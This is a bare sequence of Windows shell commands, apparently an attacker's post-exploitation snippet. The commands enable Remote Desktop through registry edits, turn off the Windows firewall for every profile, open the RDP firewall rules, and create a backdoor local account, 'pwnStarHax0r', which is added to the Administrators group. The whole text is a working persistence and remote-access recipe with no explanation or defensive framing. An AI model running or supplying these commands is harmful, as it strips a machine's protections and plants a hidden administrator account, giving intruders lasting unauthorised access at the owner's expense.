reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

NetSh Advfirewall set allprofiles state off

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

netsh firewall set service type = remotedesktop mode = enable

net user pwnStarHax0r 1AM1337APT! /add
net localgroup Administrators pwnStarHax0r /add
